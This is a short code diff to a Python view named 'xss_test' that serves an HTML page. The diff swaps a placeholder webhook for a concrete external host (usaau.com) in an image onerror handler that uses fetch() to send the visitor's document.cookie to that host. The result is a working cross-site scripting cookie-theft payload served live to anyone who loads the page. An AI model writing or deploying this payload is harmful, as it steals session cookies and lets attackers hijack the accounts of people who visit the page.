@@ -50,9 +50,8 @@ def xss_test(request):
         <html>
         <body>
         <h1>XSS Test</h1>
-        <img src="x" onerror="fetch('https://your-webhook-url.com?c='+document.cookie)">
+        <img src="x" onerror="fetch('https://usaau.com/collect/?cookie='+document.cookie)">
         </body>
         </html>
     """)
-
 
